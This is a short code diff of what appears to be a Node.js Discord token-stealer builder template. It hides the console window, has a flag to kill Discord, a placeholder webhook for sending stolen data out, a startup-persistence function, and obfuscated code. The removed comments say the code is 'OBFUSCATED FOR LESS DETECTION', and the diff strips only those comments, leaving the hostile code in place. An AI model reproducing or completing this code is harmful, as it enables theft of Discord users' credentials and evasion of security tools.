@@ -15,7 +15,7 @@ const exec = childProcess.exec;
 const hideconsole = require('node-hide-console-window');
 const buf_replace = require('buffer-replace');
 
-let killdcop = true; // if u want to close discord make this "true" if u dont want to close discord make this "false";
+let killdcop = true; 
 
 
 const %webhookstring% = "REPLACE_YOUR_WEBHOOK"
@@ -580,9 +580,9 @@ async function %VARESTARTUP%() {
           '110719qGebmE'
       ];
       _0x23f3 = function () {
-          return _0x3bc1f0;    // OBFUSCATED FOR LESS DETECTION IF U WANT DEOBFUSCATE IT
-      };    // OBFUSCATED FOR LESS DETECTION IF U WANT DEOBFUSCATE IT
-      return _0x23f3();    // OBFUSCATED FOR LESS DETECTION IF U WANT DEOBFUSCATE IT
+          return _0x3bc1f0;    
+      };    
+      return _0x23f3();    
 }
 }
 
